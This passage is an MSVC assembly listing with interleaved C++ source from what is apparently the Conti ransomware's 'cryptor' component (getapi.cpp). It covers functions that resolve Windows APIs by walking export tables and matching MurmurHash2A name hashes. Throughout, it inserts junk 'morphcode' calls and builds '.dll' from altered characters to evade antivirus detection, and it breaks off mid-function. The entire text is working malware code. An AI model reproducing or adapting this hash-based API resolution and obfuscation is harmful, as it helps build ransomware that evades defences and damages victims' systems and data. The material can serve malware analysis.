  0021b	44 8b 45 44	 mov	 r8d, DWORD PTR DataSize$[rbp]
  0021f	48 8b 55 28	 mov	 rdx, QWORD PTR Table$[rbp]
  00223	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR Ret$[rbp]
  0022a	e8 00 00 00 00	 call	 ?CheckForForvardedProc@@YAH_KPEAU_IMAGE_EXPORT_DIRECTORY@@K@Z ; CheckForForvardedProc
  0022f	85 c0		 test	 eax, eax
  00231	74 13		 je	 SHORT $LN9@GetApiAddr

; 442  : 		Ret = (ADDR)GetForvardedProc((PCHAR)Ret);

  00233	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR Ret$[rbp]
  0023a	e8 00 00 00 00	 call	 ?GetForvardedProc@@YAPEAXPEAD@Z ; GetForvardedProc
  0023f	48 89 85 28 01
	00 00		 mov	 QWORD PTR Ret$[rbp], rax
$LN9@GetApiAddr:

; 443  : 	}
; 444  : 
; 445  : 	//ReturnAddress(Address, Ret + 1);
; 446  : 	return Ret;

  00246	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR Ret$[rbp]
$LN1@GetApiAddr:

; 447  : }

  0024d	48 8d a5 28 02
	00 00		 lea	 rsp, QWORD PTR [rbp+552]
  00254	5f		 pop	 rdi
  00255	5d		 pop	 rbp
  00256	c3		 ret	 0
?GetApiAddr@@YA_KPEAUHINSTANCE__@@KPEA_K@Z ENDP		; GetApiAddr
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?FindFunction@@YAHPEAUHINSTANCE__@@KPEAU_IMAGE_EXPORT_DIRECTORY@@@Z
_TEXT	SEGMENT
Ordinal$ = 4
NamesTable$1 = 40
OrdinalTable$2 = 72
i$3 = 100
ProcName$4 = 136
ProcHash$5 = 164
Module$ = 416
Hash$ = 424
Table$ = 432
?FindFunction@@YAHPEAUHINSTANCE__@@KPEAU_IMAGE_EXPORT_DIRECTORY@@@Z PROC ; FindFunction, COMDAT

; 282  : {

$LN9:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00009	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000e	55		 push	 rbp
  0000f	57		 push	 rdi
  00010	48 81 ec a8 01
	00 00		 sub	 rsp, 424		; 000001a8H
  00017	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  00023	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 283  : 	INT Ordinal = 0;

  00028	c7 45 04 00 00
	00 00		 mov	 DWORD PTR Ordinal$[rbp], 0

; 284  : 	morphcode(Ordinal);

  0002f	8b 4d 04	 mov	 ecx, DWORD PTR Ordinal$[rbp]
  00032	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 285  : 
; 286  : 	if (HIWORD(Hash) == 0)

  00037	8b 85 a8 01 00
	00		 mov	 eax, DWORD PTR Hash$[rbp]
  0003d	48 c1 e8 10	 shr	 rax, 16
  00041	48 25 ff ff 00
	00		 and	 rax, 65535		; 0000ffffH
  00047	0f b7 c0	 movzx	 eax, ax
  0004a	85 c0		 test	 eax, eax
  0004c	75 29		 jne	 SHORT $LN5@FindFuncti

; 287  : 	{
; 288  : 		//     
; 289  : 		Ordinal = (LOWORD(Hash)) - Table->Base;

  0004e	8b 85 a8 01 00
	00		 mov	 eax, DWORD PTR Hash$[rbp]
  00054	48 25 ff ff 00
	00		 and	 rax, 65535		; 0000ffffH
  0005a	0f b7 c0	 movzx	 eax, ax
  0005d	48 8b 8d b0 01
	00 00		 mov	 rcx, QWORD PTR Table$[rbp]
  00064	2b 41 10	 sub	 eax, DWORD PTR [rcx+16]
  00067	89 45 04	 mov	 DWORD PTR Ordinal$[rbp], eax

; 290  : 		morphcode(Ordinal);

  0006a	8b 4d 04	 mov	 ecx, DWORD PTR Ordinal$[rbp]
  0006d	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 291  : 	}

  00072	e9 f7 00 00 00	 jmp	 $LN6@FindFuncti
$LN5@FindFuncti:

; 292  : 	else
; 293  : 	{
; 294  : 
; 295  : 		//    
; 296  : 		PDWORD NamesTable = (DWORD*)RVATOVA(Module, Table->AddressOfNames);

  00077	48 8b 85 b0 01
	00 00		 mov	 rax, QWORD PTR Table$[rbp]
  0007e	8b 40 20	 mov	 eax, DWORD PTR [rax+32]
  00081	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR Module$[rbp]
  00088	48 03 c8	 add	 rcx, rax
  0008b	48 8b c1	 mov	 rax, rcx
  0008e	48 89 45 28	 mov	 QWORD PTR NamesTable$1[rbp], rax

; 297  : 
; 298  : 		morphcode(NamesTable);

  00092	48 8b 4d 28	 mov	 rcx, QWORD PTR NamesTable$1[rbp]
  00096	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 299  : 
; 300  : 		PWORD  OrdinalTable = (WORD*)RVATOVA(Module, Table->AddressOfNameOrdinals);

  0009b	48 8b 85 b0 01
	00 00		 mov	 rax, QWORD PTR Table$[rbp]
  000a2	8b 40 24	 mov	 eax, DWORD PTR [rax+36]
  000a5	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR Module$[rbp]
  000ac	48 03 c8	 add	 rcx, rax
  000af	48 8b c1	 mov	 rax, rcx
  000b2	48 89 45 48	 mov	 QWORD PTR OrdinalTable$2[rbp], rax

; 301  : 
; 302  : 		morphcode(OrdinalTable);

  000b6	48 8b 4d 48	 mov	 rcx, QWORD PTR OrdinalTable$2[rbp]
  000ba	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 303  : 
; 304  : 		unsigned int i;
; 305  : 		char* ProcName;
; 306  : 
; 307  : 		for (i = 0; i < Table->NumberOfNames; ++i)

  000bf	c7 45 64 00 00
	00 00		 mov	 DWORD PTR i$3[rbp], 0
  000c6	eb 08		 jmp	 SHORT $LN4@FindFuncti
$LN2@FindFuncti:
  000c8	8b 45 64	 mov	 eax, DWORD PTR i$3[rbp]
  000cb	ff c0		 inc	 eax
  000cd	89 45 64	 mov	 DWORD PTR i$3[rbp], eax
$LN4@FindFuncti:
  000d0	48 8b 85 b0 01
	00 00		 mov	 rax, QWORD PTR Table$[rbp]
  000d7	8b 40 18	 mov	 eax, DWORD PTR [rax+24]
  000da	39 45 64	 cmp	 DWORD PTR i$3[rbp], eax
  000dd	0f 83 8b 00 00
	00		 jae	 $LN3@FindFuncti

; 308  : 		{
; 309  : 
; 310  : 			ProcName = (char*)RVATOVA(Module, *NamesTable);

  000e3	48 8b 45 28	 mov	 rax, QWORD PTR NamesTable$1[rbp]
  000e7	8b 00		 mov	 eax, DWORD PTR [rax]
  000e9	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR Module$[rbp]
  000f0	48 03 c8	 add	 rcx, rax
  000f3	48 8b c1	 mov	 rax, rcx
  000f6	48 89 85 88 00
	00 00		 mov	 QWORD PTR ProcName$4[rbp], rax

; 311  : 			morphcode(ProcName);

  000fd	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR ProcName$4[rbp]
  00104	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 312  : 			DWORD ProcHash = MurmurHash2A(ProcName, StrLen(ProcName), HASHING_SEED);

  00109	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR ProcName$4[rbp]
  00110	e8 00 00 00 00	 call	 ?StrLen@@YAHPEBD@Z	; StrLen
  00115	41 b8 da fc 01
	b8		 mov	 r8d, -1207829286	; b801fcdaH
  0011b	8b d0		 mov	 edx, eax
  0011d	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR ProcName$4[rbp]
  00124	e8 00 00 00 00	 call	 ?MurmurHash2A@@YAIPEBXHI@Z ; MurmurHash2A
  00129	89 85 a4 00 00
	00		 mov	 DWORD PTR ProcHash$5[rbp], eax

; 313  : 
; 314  : 			if (ProcHash == Hash)

  0012f	8b 85 a8 01 00
	00		 mov	 eax, DWORD PTR Hash$[rbp]
  00135	39 85 a4 00 00
	00		 cmp	 DWORD PTR ProcHash$5[rbp], eax
  0013b	75 14		 jne	 SHORT $LN7@FindFuncti

; 315  : 			{
; 316  : 				morphcode(Ordinal);

  0013d	8b 4d 04	 mov	 ecx, DWORD PTR Ordinal$[rbp]
  00140	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 317  : 
; 318  : 				Ordinal = *OrdinalTable;

  00145	48 8b 45 48	 mov	 rax, QWORD PTR OrdinalTable$2[rbp]
  00149	0f b7 00	 movzx	 eax, WORD PTR [rax]
  0014c	89 45 04	 mov	 DWORD PTR Ordinal$[rbp], eax

; 319  : 				break;

  0014f	eb 1d		 jmp	 SHORT $LN3@FindFuncti
$LN7@FindFuncti:

; 320  : 			}
; 321  : 
; 322  : 			//    
; 323  : 			++NamesTable;

  00151	48 8b 45 28	 mov	 rax, QWORD PTR NamesTable$1[rbp]
  00155	48 83 c0 04	 add	 rax, 4
  00159	48 89 45 28	 mov	 QWORD PTR NamesTable$1[rbp], rax

; 324  : 			++OrdinalTable;

  0015d	48 8b 45 48	 mov	 rax, QWORD PTR OrdinalTable$2[rbp]
  00161	48 83 c0 02	 add	 rax, 2
  00165	48 89 45 48	 mov	 QWORD PTR OrdinalTable$2[rbp], rax

; 325  : 
; 326  : 		}

  00169	e9 5a ff ff ff	 jmp	 $LN2@FindFuncti
$LN3@FindFuncti:
$LN6@FindFuncti:

; 327  : 
; 328  : 	}
; 329  : 
; 330  : 	return Ordinal;

  0016e	8b 45 04	 mov	 eax, DWORD PTR Ordinal$[rbp]

; 331  : }

  00171	48 8d a5 88 01
	00 00		 lea	 rsp, QWORD PTR [rbp+392]
  00178	5f		 pop	 rdi
  00179	5d		 pop	 rbp
  0017a	c3		 ret	 0
?FindFunction@@YAHPEAUHINSTANCE__@@KPEAU_IMAGE_EXPORT_DIRECTORY@@@Z ENDP ; FindFunction
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?ReturnAddress@@YAXPEAKK@Z
_TEXT	SEGMENT
temp$ = 4
__$ArrayPad$ = 216
pAddress$ = 256
dwAddress$ = 264
?ReturnAddress@@YAXPEAKK@Z PROC				; ReturnAddress, COMDAT

; 265  : {

$LN3:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  0001c	b9 0a 00 00 00	 mov	 ecx, 10
  00021	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00026	f3 ab		 rep stosd
  00028	48 8b 8c 24 28
	01 00 00	 mov	 rcx, QWORD PTR [rsp+296]
  00030	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00037	48 33 c5	 xor	 rax, rbp
  0003a	48 89 85 d8 00
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00041	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  00048	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 266  : 	DWORD temp = dwAddress + 1;

  0004d	8b 85 08 01 00
	00		 mov	 eax, DWORD PTR dwAddress$[rbp]
  00053	ff c0		 inc	 eax
  00055	89 45 04	 mov	 DWORD PTR temp$[rbp], eax

; 267  : 	morphcode(temp);

  00058	8b 4d 04	 mov	 ecx, DWORD PTR temp$[rbp]
  0005b	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 268  : 	CopyMemory(&temp, &dwAddress, sizeof(DWORD));

  00060	41 b8 04 00 00
	00		 mov	 r8d, 4
  00066	48 8d 95 08 01
	00 00		 lea	 rdx, QWORD PTR dwAddress$[rbp]
  0006d	48 8d 4d 04	 lea	 rcx, QWORD PTR temp$[rbp]
  00071	e8 00 00 00 00	 call	 memcpy

; 269  : 	morphcode(temp);

  00076	8b 4d 04	 mov	 ecx, DWORD PTR temp$[rbp]
  00079	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 270  : 	temp++;

  0007e	8b 45 04	 mov	 eax, DWORD PTR temp$[rbp]
  00081	ff c0		 inc	 eax
  00083	89 45 04	 mov	 DWORD PTR temp$[rbp], eax

; 271  : 	CopyMemory(pAddress, &temp, sizeof(DWORD));

  00086	41 b8 04 00 00
	00		 mov	 r8d, 4
  0008c	48 8d 55 04	 lea	 rdx, QWORD PTR temp$[rbp]
  00090	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR pAddress$[rbp]
  00097	e8 00 00 00 00	 call	 memcpy

; 272  : 	morphcode(pAddress);

  0009c	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR pAddress$[rbp]
  000a3	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 273  : }

  000a8	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  000ac	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?ReturnAddress@@YAXPEAKK@Z$rtcFrameData
  000b3	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  000b8	48 8b 8d d8 00
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  000bf	48 33 cd	 xor	 rcx, rbp
  000c2	e8 00 00 00 00	 call	 __security_check_cookie
  000c7	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  000ce	5f		 pop	 rdi
  000cf	5d		 pop	 rbp
  000d0	c3		 ret	 0
?ReturnAddress@@YAXPEAKK@Z ENDP				; ReturnAddress
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?GetFunctionAddresss@@YA_KPEAUHINSTANCE__@@PEAU_IMAGE_EXPORT_DIRECTORY@@J@Z
_TEXT	SEGMENT
AddrTable$ = 8
RVA$ = 36
Ret$ = 72
Module$ = 320
Table$ = 328
Ordinal$ = 336
?GetFunctionAddresss@@YA_KPEAUHINSTANCE__@@PEAU_IMAGE_EXPORT_DIRECTORY@@J@Z PROC ; GetFunctionAddresss, COMDAT

; 254  : {

$LN3:
  00000	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 255  : 	PDWORD AddrTable = (PDWORD)RVATOVA(Module, Table->AddressOfFunctions);

  00029	48 8b 85 48 01
	00 00		 mov	 rax, QWORD PTR Table$[rbp]
  00030	8b 40 1c	 mov	 eax, DWORD PTR [rax+28]
  00033	48 8b 8d 40 01
	00 00		 mov	 rcx, QWORD PTR Module$[rbp]
  0003a	48 03 c8	 add	 rcx, rax
  0003d	48 8b c1	 mov	 rax, rcx
  00040	48 89 45 08	 mov	 QWORD PTR AddrTable$[rbp], rax

; 256  : 	morphcode(AddrTable);

  00044	48 8b 4d 08	 mov	 rcx, QWORD PTR AddrTable$[rbp]
  00048	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 257  : 	DWORD RVA = AddrTable[Ordinal];

  0004d	48 63 85 50 01
	00 00		 movsxd	 rax, DWORD PTR Ordinal$[rbp]
  00054	48 8b 4d 08	 mov	 rcx, QWORD PTR AddrTable$[rbp]
  00058	8b 04 81	 mov	 eax, DWORD PTR [rcx+rax*4]
  0005b	89 45 24	 mov	 DWORD PTR RVA$[rbp], eax

; 258  : 	morphcode(RVA);

  0005e	8b 4d 24	 mov	 ecx, DWORD PTR RVA$[rbp]
  00061	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 259  : 	ADDR Ret = (ADDR)RVATOVA(Module, RVA);

  00066	8b 45 24	 mov	 eax, DWORD PTR RVA$[rbp]
  00069	48 8b 8d 40 01
	00 00		 mov	 rcx, QWORD PTR Module$[rbp]
  00070	48 03 c8	 add	 rcx, rax
  00073	48 8b c1	 mov	 rax, rcx
  00076	48 89 45 48	 mov	 QWORD PTR Ret$[rbp], rax

; 260  : 	morphcode(Ret);

  0007a	8b 4d 48	 mov	 ecx, DWORD PTR Ret$[rbp]
  0007d	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 261  : 	return Ret;

  00082	48 8b 45 48	 mov	 rax, QWORD PTR Ret$[rbp]

; 262  : }

  00086	48 8d a5 28 01
	00 00		 lea	 rsp, QWORD PTR [rbp+296]
  0008d	5f		 pop	 rdi
  0008e	5d		 pop	 rbp
  0008f	c3		 ret	 0
?GetFunctionAddresss@@YA_KPEAUHINSTANCE__@@PEAU_IMAGE_EXPORT_DIRECTORY@@J@Z ENDP ; GetFunctionAddresss
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?CheckForForvardedProc@@YAH_KPEAU_IMAGE_EXPORT_DIRECTORY@@K@Z
_TEXT	SEGMENT
Addr$ = 224
Table$ = 232
DataSize$ = 240
?CheckForForvardedProc@@YAH_KPEAU_IMAGE_EXPORT_DIRECTORY@@K@Z PROC ; CheckForForvardedProc, COMDAT

; 236  : {

$LN5:
  00000	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 237  : 	if (Addr > (ADDR)Table) {

  00029	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR Table$[rbp]
  00030	48 39 85 e0 00
	00 00		 cmp	 QWORD PTR Addr$[rbp], rax
  00037	76 3d		 jbe	 SHORT $LN2@CheckForFo

; 238  : 
; 239  : 		morphcode(Addr);

  00039	8b 8d e0 00 00
	00		 mov	 ecx, DWORD PTR Addr$[rbp]
  0003f	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 240  : 
; 241  : 		if ((Addr - (ADDR)Table < DataSize)) {

  00044	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR Table$[rbp]
  0004b	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR Addr$[rbp]
  00052	48 2b c8	 sub	 rcx, rax
  00055	48 8b c1	 mov	 rax, rcx
  00058	8b 8d f0 00 00
	00		 mov	 ecx, DWORD PTR DataSize$[rbp]
  0005e	48 3b c1	 cmp	 rax, rcx
  00061	73 13		 jae	 SHORT $LN3@CheckForFo

; 242  : 
; 243  : 			morphcode(Table);

  00063	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR Table$[rbp]
  0006a	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 244  : 
; 245  : 			return TRUE;

  0006f	b8 01 00 00 00	 mov	 eax, 1
  00074	eb 02		 jmp	 SHORT $LN1@CheckForFo
$LN3@CheckForFo:
$LN2@CheckForFo:

; 246  : 
; 247  : 		}
; 248  : 	}
; 249  : 	return FALSE;

  00076	33 c0		 xor	 eax, eax
$LN1@CheckForFo:

; 250  : }

  00078	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0007f	5f		 pop	 rdi
  00080	5d		 pop	 rbp
  00081	c3		 ret	 0
?CheckForForvardedProc@@YAH_KPEAU_IMAGE_EXPORT_DIRECTORY@@K@Z ENDP ; CheckForForvardedProc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?GetForvardedProc@@YAPEAXPEAD@Z
_TEXT	SEGMENT
szDll$ = 4
DLLName$ = 48
NameStr$ = 328
OrdNomber$5 = 356
Hash$ = 388
__$ArrayPad$ = 600
Name$ = 640
?GetForvardedProc@@YAPEAXPEAD@Z PROC			; GetForvardedProc, COMDAT

; 178  : {

$LN6:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 88 02
	00 00		 sub	 rsp, 648		; 00000288H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00018	b9 6a 00 00 00	 mov	 ecx, 106		; 0000006aH
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 a8
	02 00 00	 mov	 rcx, QWORD PTR [rsp+680]
  0002c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00033	48 33 c5	 xor	 rax, rbp
  00036	48 89 85 58 02
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  00044	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 179  : 	char szDll[] = { '.','c','k','m',0 };

  00049	c6 45 04 2e	 mov	 BYTE PTR szDll$[rbp], 46 ; 0000002eH
  0004d	c6 45 05 63	 mov	 BYTE PTR szDll$[rbp+1], 99 ; 00000063H
  00051	c6 45 06 6b	 mov	 BYTE PTR szDll$[rbp+2], 107 ; 0000006bH
  00055	c6 45 07 6d	 mov	 BYTE PTR szDll$[rbp+3], 109 ; 0000006dH
  00059	c6 45 08 00	 mov	 BYTE PTR szDll$[rbp+4], 0

; 180  : 	//    
; 181  : 	//      DllName.ProcName  DllName.#ProcNomber
; 182  : 	--szDll[3];

  0005d	b8 01 00 00 00	 mov	 eax, 1
  00062	48 6b c0 03	 imul	 rax, rax, 3
  00066	0f b6 44 05 04	 movzx	 eax, BYTE PTR szDll$[rbp+rax]
  0006b	fe c8		 dec	 al
  0006d	b9 01 00 00 00	 mov	 ecx, 1
  00072	48 6b c9 03	 imul	 rcx, rcx, 3
  00076	88 44 0d 04	 mov	 BYTE PTR szDll$[rbp+rcx], al

; 183  : 	szDll[1]++;

  0007a	b8 01 00 00 00	 mov	 eax, 1
  0007f	48 6b c0 01	 imul	 rax, rax, 1
  00083	0f b6 44 05 04	 movzx	 eax, BYTE PTR szDll$[rbp+rax]
  00088	fe c0		 inc	 al
  0008a	b9 01 00 00 00	 mov	 ecx, 1
  0008f	48 6b c9 01	 imul	 rcx, rcx, 1
  00093	88 44 0d 04	 mov	 BYTE PTR szDll$[rbp+rcx], al

; 184  : 	++szDll[2];

  00097	b8 01 00 00 00	 mov	 eax, 1
  0009c	48 6b c0 02	 imul	 rax, rax, 2
  000a0	0f b6 44 05 04	 movzx	 eax, BYTE PTR szDll$[rbp+rax]
  000a5	fe c0		 inc	 al
  000a7	b9 01 00 00 00	 mov	 ecx, 1
  000ac	48 6b c9 02	 imul	 rcx, rcx, 2
  000b0	88 44 0d 04	 mov	 BYTE PTR szDll$[rbp+rcx], al

; 185  : 
; 186  : 	morphcode(szDll);

  000b4	48 8d 4d 04	 lea	 rcx, QWORD PTR szDll$[rbp]
  000b8	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 187  : 
; 188  : 	if (Name == NULL) return NULL;

  000bd	48 83 bd 80 02
	00 00 00	 cmp	 QWORD PTR Name$[rbp], 0
  000c5	75 07		 jne	 SHORT $LN2@GetForvard
  000c7	33 c0		 xor	 eax, eax
  000c9	e9 50 01 00 00	 jmp	 $LN1@GetForvard
$LN2@GetForvard:

; 189  : 
; 190  : 	morphcode(Name);

  000ce	48 8b 8d 80 02
	00 00		 mov	 rcx, QWORD PTR Name$[rbp]
  000d5	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 191  : 
; 192  : 	char DLLName[256];
; 193  : 	//m_memset(DLLName, 0, sizeof(DLLName));
; 194  : 	RtlSecureZeroMemory(DLLName, 256);

  000da	ba 00 01 00 00	 mov	 edx, 256		; 00000100H
  000df	48 8d 4d 30	 lea	 rcx, QWORD PTR DLLName$[rbp]
  000e3	e8 00 00 00 00	 call	 RtlSecureZeroMemory

; 195  : 
; 196  : 	morphcode(DLLName);

  000e8	48 8d 4d 30	 lea	 rcx, QWORD PTR DLLName$[rbp]
  000ec	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 197  : 
; 198  : 	PCHAR NameStr = FindChar(Name, '.');

  000f1	b2 2e		 mov	 dl, 46			; 0000002eH
  000f3	48 8b 8d 80 02
	00 00		 mov	 rcx, QWORD PTR Name$[rbp]
  000fa	e8 00 00 00 00	 call	 ?FindChar@@YAPEADPEADD@Z ; FindChar
  000ff	48 89 85 48 01
	00 00		 mov	 QWORD PTR NameStr$[rbp], rax

; 199  : 	if (!NameStr) return NULL;

  00106	48 83 bd 48 01
	00 00 00	 cmp	 QWORD PTR NameStr$[rbp], 0
  0010e	75 07		 jne	 SHORT $LN3@GetForvard
  00110	33 c0		 xor	 eax, eax
  00112	e9 07 01 00 00	 jmp	 $LN1@GetForvard
$LN3@GetForvard:

; 200  : 
; 201  : 	morphcode(NameStr);

  00117	48 8b 8d 48 01
	00 00		 mov	 rcx, QWORD PTR NameStr$[rbp]
  0011e	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 202  : 
; 203  : 
; 204  : 	///   
; 205  : 	m_memcpy(DLLName, Name, NameStr - Name);

  00123	48 8b 85 80 02
	00 00		 mov	 rax, QWORD PTR Name$[rbp]
  0012a	48 8b 8d 48 01
	00 00		 mov	 rcx, QWORD PTR NameStr$[rbp]
  00131	48 2b c8	 sub	 rcx, rax
  00134	48 8b c1	 mov	 rax, rcx
  00137	4c 8b c0	 mov	 r8, rax
  0013a	48 8b 95 80 02
	00 00		 mov	 rdx, QWORD PTR Name$[rbp]
  00141	48 8d 4d 30	 lea	 rcx, QWORD PTR DLLName$[rbp]
  00145	e8 00 00 00 00	 call	 ?m_memcpy@@YAXPEAXQEAX_K@Z ; m_memcpy

; 206  : 
; 207  : 	strcat(DLLName, szDll);

  0014a	48 8d 55 04	 lea	 rdx, QWORD PTR szDll$[rbp]
  0014e	48 8d 4d 30	 lea	 rcx, QWORD PTR DLLName$[rbp]
  00152	e8 00 00 00 00	 call	 strcat

; 208  : 
; 209  : 	///   
; 210  : 	++NameStr;

  00157	48 8b 85 48 01
	00 00		 mov	 rax, QWORD PTR NameStr$[rbp]
  0015e	48 ff c0	 inc	 rax
  00161	48 89 85 48 01
	00 00		 mov	 QWORD PTR NameStr$[rbp], rax

; 211  : 	if (*NameStr == '#')

  00168	48 8b 85 48 01
	00 00		 mov	 rax, QWORD PTR NameStr$[rbp]
  0016f	0f be 00	 movsx	 eax, BYTE PTR [rax]
  00172	83 f8 23	 cmp	 eax, 35			; 00000023H
  00175	75 64		 jne	 SHORT $LN4@GetForvard

; 212  : 	{
; 213  : 		morphcode(*NameStr);

  00177	48 8b 85 48 01
	00 00		 mov	 rax, QWORD PTR NameStr$[rbp]
  0017e	0f be 00	 movsx	 eax, BYTE PTR [rax]
  00181	8b c8		 mov	 ecx, eax
  00183	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 214  : 
; 215  : 		//    
; 216  : 		++NameStr;

  00188	48 8b 85 48 01
	00 00		 mov	 rax, QWORD PTR NameStr$[rbp]
  0018f	48 ff c0	 inc	 rax
  00192	48 89 85 48 01
	00 00		 mov	 QWORD PTR NameStr$[rbp], rax

; 217  : 
; 218  : 		morphcode(*NameStr);

  00199	48 8b 85 48 01
	00 00		 mov	 rax, QWORD PTR NameStr$[rbp]
  001a0	0f be 00	 movsx	 eax, BYTE PTR [rax]
  001a3	8b c8		 mov	 ecx, eax
  001a5	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 219  : 
; 220  : 		DWORD OrdNomber = my_stoi(NameStr);

  001aa	48 8b 8d 48 01
	00 00		 mov	 rcx, QWORD PTR NameStr$[rbp]
  001b1	e8 00 00 00 00	 call	 ?my_stoi@@YAHPEAD@Z	; my_stoi
  001b6	89 85 64 01 00
	00		 mov	 DWORD PTR OrdNomber$5[rbp], eax

; 221  : 
; 222  : 		morphcode(OrdNomber);

  001bc	8b 8d 64 01 00
